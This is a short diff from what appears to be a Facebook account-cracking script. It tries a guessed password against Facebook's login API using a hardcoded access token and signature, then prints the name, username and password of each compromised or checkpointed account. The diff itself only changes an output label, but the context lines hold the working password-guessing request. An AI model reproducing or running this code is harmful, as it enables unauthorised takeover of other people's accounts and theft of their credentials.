@@ -512,7 +512,7 @@ def Mini()
                 puts ("\033[93m[] Account Has Been Checkpoint")
                 puts ("\033[92m[] Name : "+b['name'])
                 puts ("\033[92m[] username : "+id)
-                puts ("\033[92m[✓l] password : "+pw)
+                puts ("\033[92m[l] password : "+pw)
               else
                 pw = "Anjing"
                 x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
